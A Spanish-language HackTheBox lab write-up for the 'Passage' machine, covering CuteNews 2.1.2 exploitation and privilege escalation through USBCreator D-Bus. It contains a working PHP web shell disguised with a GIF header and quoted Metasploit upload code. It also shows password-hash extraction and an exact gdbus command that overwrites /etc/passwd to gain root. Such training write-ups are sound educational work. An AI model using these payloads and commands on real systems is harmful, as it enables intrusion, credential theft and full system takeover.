---
layout      : post
title       : "Maquina Passage - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Passage/passage.png
category    : [ hackthebox ]
tags        : [ CuteNews Explotation, Code Analysis, USBCreator D-Bus ]
---

El dia de hoy vamos a estar resolviendo la maquina Passage de `hackthebox` que es una maquina `Linux` de dificultad `Media`. Para explotar esta maquina abusaremos una vulnerabilidad de `Cute News` con la que obtendremos ejecución remota de comandos, despues haremos un analisis de codigo de un repositorio publico en github para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario `root` nos aprovecharemos de `USBCreator`

Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Passage
❯ ls
 Passage
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.206
PING 10.10.10.206 (10.10.10.206) 56(84) bytes of data.
64 bytes from 10.10.10.206: icmp_seq=1 ttl=63 time=210 ms

--- 10.10.10.206 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 210.072/210.072/210.072/0.000 ms
```
Vemos que la maquina nos responde con un `ttl` de `63` correspondiente a una maquina `linux`, ahora procederemoscon el escaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.206 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:25 GMT
Initiating SYN Stealth Scan at 16:25
Scanning 10.10.10.206 [65535 ports]
Discovered open port 22/tcp on 10.10.10.206
Discovered open port 80/tcp on 10.10.10.206
Completed SYN Stealth Scan at 16:25, 16.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.206
Host is up, received user-set (0.12s latency).
Scanned at 2023-04-17 16:25:13 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
           Raw packets sent: 82801 (3.643MB) | Rcvd: 82648 (3.306MB)
```

Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  `22 ssh` , `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,80 10.10.10.206 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:27 GMT
Nmap scan report for 10.10.10.206
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
```

Visulizamos la versión de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 7.2p2|
| 80   | HTTP     |  Apache httpd 2.4.18|



## Explotación [#](#explotación) {#explotación}

Primeramente ya que `nmap` nos reporto que el puerto `80` se encuentra abiertos usaremos `whatweb` para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.

```bash
❯ whatweb http://10.10.10.206
http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]
```

> Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP

La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a `Cutenews`, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro `/etc/hosts`

```bash
❯ echo "10.10.10.206 passage.htb" >> /etc/hosts
```

Vamos a proceder a abrir el servicio web en el navegador

![](/assets/images/HTB/htb-writeup-Passage/cute1.PNG)


A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.

![](/assets/images/HTB/htb-writeup-Passage/cute2.PNG)

Visualizamos que existe una ruta de nombre `CuteNews` y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.

![](/assets/images/HTB/htb-writeup-Passage/cute3.PNG)

Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de `CuteNews` que se esta utilizando.

Verificamos si hay algun exploit publico `searchsploit` y efectivamente existen vulnerabilidades asociadas a esta versión especifica `2.1.2`

```bash
❯ searchsploit cutenews 2.1.2
------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                           | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                               | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                   | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                 | php/webapps/48800.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
```

Tenemos exploits que corresponden a `RCE`, el primero de ellos nos habla de algo asociado con `avatar`, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.


Procedamos a registrarnos en el servicio.


![](/assets/images/HTB/htb-writeup-Passage/cute4.PNG)


Una vez registrados, obervamos en nuestro panel un campo correspondiente a `avatar`, y si recordamos antes vimos un `exploit` asociado que justamente nos hablaba de algo de `avatar`. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la `RCE` en el exploit la obtiene de un mal control en la subida de archivos.

![](/assets/images/HTB/htb-writeup-Passage/cute5.PNG)


Para estar seguros podemos examinar el exploit y ver que que trata. 


Efectivamente dentro encontramos una función que lo que hace es realizar una petición en `avatar` subiendo un arhivo `php` que incluye una cabecera `GIF` y de Content-Type `image/png`: esto para mediante el uso de `Magic Numbers` hacer un `bypass` aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un `GIF`.


```ruby
def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
      'cookie'   => cookie
    })

    signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
    signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
    # data preparation
    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    @shell = "#{fname}"
    pdata = Rex::MIME::Message.new
    pdata.add_part('main', nil, nil, 'form-data; name="mod"')
    pdata.add_part('personal', nil, nil, 'form-data; name="opt"')
    pdata.add_part("#{signkey}", nil, nil, 'form-data; name="__signature_key"')
    pdata.add_part("#{signdsi}", nil, nil, 'form-data; name="__signature_dsi"')
    pdata.add_part('', nil, nil, 'form-data; name="editpassword"')
    pdata.add_part('', nil, nil, 'form-data; name="confirmpassword"')
    pdata.add_part("#{datastore['USERNAME']}", nil, nil, 'form-data; name="editnickname"')
    pdata.add_part("GIF\r\n" + payload.encoded, 'image/png', nil, "form-data; name=\"avatar_file\"; filename=\"#{fname}\"")
    pdata.add_part('', nil, nil, 'form-data; name="more[site]"')
    pdata.add_part('', nil, nil, 'form-data; name="more[about]"')
    data = pdata.to_s
```

Puedes ver este articulo, para comprender a mayor detalle el uso de `Magic Numbers` 

* [List-of-file-signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)


Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo `php` con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido `cmd` en conjunto con la función `shell_exec`. Seguidamente subiremos el archivo.

```php
❯ cat cmd.php
GIF8;

<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![](/assets/images/HTB/htb-writeup-Passage/cute6.PNG)

El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.

![](/assets/images/HTB/htb-writeup-Passage/cute8.PNG)

Vamos a la ruta indicada de nombre `uploads` y si vemos nuestro archivo subido.

![](/assets/images/HTB/htb-writeup-Passage/cute9.PNG)

Verificamos que podemos ejecutar comandos y estamos como `www-data`

![](/assets/images/HTB/htb-writeup-Passage/cute10.PNG)

Lo que sigue sera mandarnos una `reverse shell` a nuestra maquina haciendo uso `bash` y poniendonos en escucha con `ncat`

> Recordatorio no olvidar urlencodear el caracter `&` a `%26` para evitar problemas al procesarse la petición.

Enviamos la petición 

![](/assets/images/HTB/htb-writeup-Passage/cute11.PNG)


y recibimos la conexión como el usuario `www-data`.

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:43080.
bash: cannot set terminal process group (1683): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ whoami
whoami
www-data
```

Como es de costumbre, vamos a obtener una `tty` full interactiva con los comandos de siempre.

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bash
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
```

> Cabe recordar que el numero de `rows` y `columns` corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando `stty size`


Existe un repositorio de `CuteNews` publico en github:

* [Cutenews-2.0](https://github.com/CuteNews/cutenews-2.0)

Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como `mysql`. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre `cdata`.

```bash
www-data@passage:/var/www/html/CuteNews/cdata$ ls 
Default.tpl	    backup	 category.db.php  confirmations.php  idnews.db.php   news	 postponed_news.txt  template		  users.txt
Headlines.tpl	    btree	 comments.txt	  csrf.php	     installed.mark  news.txt	 replaces.php	     unapproved_news.txt
archives	    cache	 conf.php	  flood.db.php       ipban.db.php    newsid.txt  rss.tpl	     users
auto_archive.db.php  cat.num.php  config.php	  flood.txt	     log	     plugins	 rss_config.php      users.db.php
```

Dentro de este directorio en el directorio `users`, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del `usuario` en `md5` y le agrega la extensión `php`.


Como yo cree el usuario `fmiracle`, los primeros caracteres corresponderian a `cb` 
```bash
❯ echo -n "fmiracle" | md5sum
cb151a66aabded3ee89f616afab7b6c9
```

Vemos que si existe un archivo `cb.php` en el directorio asi que procedemos a leerlo

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb.php 
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-d
```

Ya que el formato esta en `base64` usaremos un `base64 -d` para decodificarla y vemos el `hash` correspondiente a la contraseña.

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage" | base64 -d; echo

a:1:{s:4:"name";a:1:{s:8:"fmiracle";a:9:{s:2:"id";s:10:"1681750802";s:4:"name";s:8:"fmiracle";s:3:"acl";s:1:"4";s:5:"email";s:21:"fmiracle@fmiracle.com";s:4:"nick";s:8:"fmiracle";s:4:"pass";s:64:"48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:23:"avatar_fmiracle_cmd.php";s:6:"e-hide";s:0:"";}}}
                                          base64: invalid input
```

Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a los usuarios registrados.

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v "denied" | base64 -d; echo
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
```

De los hashes obtenidos procederemos a crackearlos en nuestra web de confianza.

* [https://crackstation.net/](https://crackstation.net/)

Logramos obtener unas contraseñas en texto claro.

![](/assets/images/HTB/htb-writeup-Passage/cute12.PNG)

Ahora intentaremos logearnos con algunos de los usuarios del sistema, haciendo uso de las contraseñas que obtuvimos y conseguimos logearnos como el usuario `paul`. Podemos ir a su directorio de trabajo y visualizar la primera flag `user.txt`

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
Password: 
paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul/
paul@passage:~$ cat user.txt 
9914c80b41f867472dd68c1e54c77609
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando al usuario `paul`, encontramos que tenemos un directorio oculto `.ssh`.

```bash
paul@passage:~$ ls -la
total 112
drwxr-x--- 16 paul paul 4096 Sep  2  2020 .
drwxr-xr-x  4 root root 4096 Jul 21  2020 ..
----------  1 paul paul    0 Jul 21  2020 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
drwx------ 10 paul paul 4096 Sep  1  2020 .cache
drwx------ 14 paul paul 4096 Aug 24  2020 .config
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop
-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
drwx------  2 paul paul 4096 Aug 24  2020 .gconf
drwx------  3 paul paul 4096 Sep  2  2020 .gnupg
-rw-------  1 paul paul 1292 Sep  2  2020 .ICEauthority
drwx------  3 paul paul 4096 Aug 24  2020 .local
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates
-r--------  1 paul paul   33 Apr 17 09:08 user.txt
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos
-rw-------  1 paul paul   52 Sep  2  2020 .Xauthority
-rw-------  1 paul paul 1228 Sep  2  2020 .xsession-errors
-rw-------  1 paul paul 1397 Sep  1  2020 .xsession-errors.old
```

Dentro del directorio podemos visualizar una clave `authorized_keys`, que pertenece al usuario `nadav`


```bash
paul@passage:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

Por principios basicos de claves `ssh` al tener la clave publica del usuario `nadav`, puedo conectarme como a la propia maquina sin proporcionar contraseña.

```bash
paul@passage:~/.ssh$ ssh nadav@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ whoami
nadav
```
Ahora que somos el usuario `nadav`, listamos los recursos de su directorio personal y tratando de leer los archivos ocultos, vemos el contenido del archivo `viminfo`, el cual hace bastante mención a un archivo `USBCreator`.


```bash
nadav@passage:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	"	12	7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	"	2	0
	.	2	0
	+	2	0
```

Como hace mucha referencia a el archivo `USBCreator`, vamos a proceder a buscar si exiten vulnerabilidades asociadas y concretamente entramos una relacionada a `Privilege Escalataion`


Aqui el articulo para mayor detalle:

* [Usbcreator-d-bus-privilege-escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

En resumen la vulnerabilidad aprovecha una cierta capacidad de sobrescritura de los permisos de un archivo usando el comando `gdbus`, cambiandolos por los del usuario privilegiado `root`.
Podemos aprovecharnos de esta vulnerabilidad de muchas maneras. Concretamente en este caso primero realizaremos una copia del `/etc/passwd` de la maquina y lo modificaremos agregando una contraseña que vamos a computar con `openssl` al usuario `root`. Y una vez tengamos el archivo modificado aprovecharemos de esta vulnerabilidad para sobrescribir el archivo original del `/etc/passwd` con el nuevo que tenemos, de modo que al haberle cambiado la contraseña a `root` podamos convertirnos en el con la contraeñas que le indicamos.

Vamos a hacerlo paso a paso para que se entienda:

Primero nos copias el `/etc/passwd` para evitar problemas de permisos lo haremos en la ruta `tmp`

```bash
nadav@passage:/tmp$ cp /etc/passwd .
nadav@passage:/tmp$ ls
config-err-QHQCht                                                       systemd-private-70af303641bf4fb2935fb9f554b4ff23-fwupd.service-rSKHgW              unity_support_test.0
passwd                                                                  systemd-private-70af303641bf4fb2935fb9f554b4ff23-rtkit-daemon.service-1jCj09       VMwareDnD
systemd-private-70af303641bf4fb2935fb9f554b4ff23-colord.service-h1Z4SP  systemd-private-70af303641bf4fb2935fb9f554b4ff23-systemd-timesyncd.service-zchybP  vmware-root
```

Una vez tenemos el `passwd`, vamos a crearnos una contraseña, la cual tiene que estar en formato `desk unix`. Eso lo hacemos con `openssl passwd`, el cual nos pedira una contraseña. En este caso le pondre algo simple como la palabra `hola`, pero se puede poner cualquier cosa.

```bash
nadav@passage:/tmp$ openssl passwd
Password: 
Verifying - Password: 
POoz1bD1QhbD.
```

Seguidamente debemos modifcar el `passwd` y en `root`. Para esto reeemplazamos la `x` por nuestra contraseña.

```bash
nadav@passage:/tmp$ cat passwd 
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nolog
```

Despues tal y como nos dice la vulnerabilidad, usamos el comando `gdbuss` tal cual los parametros mencionados y le indicamos primero nuestro archivo `/tmp/passwd`y seguido la ruta original donde lo sobreescribiremos `/etc/passwd` finalmente el parametro `true`

```bash
nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true
()
```

Ahora proceremos a leer el archivo `/etc/passwd`.


```bash
nadav@passage:/tmp$ cat /etc/passwd
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Vemos que efectivamente lo modificamos la contraseña del usuario `root`. Lo que nos queda ahora es migrar al usuario `root`, dirigirnos a su directorio personal y visualizar la segunda flag `root.txt`.

```bash
nadav@passage:/tmp$ su root
Password: 
root@passage:/tmp# cd /root
root@passage:~# cat root.txt
36b5bcee8e0d7f4be426e8016250dd7f
root@passage:~#
```

Esto seria todo por esta ocasión 😄
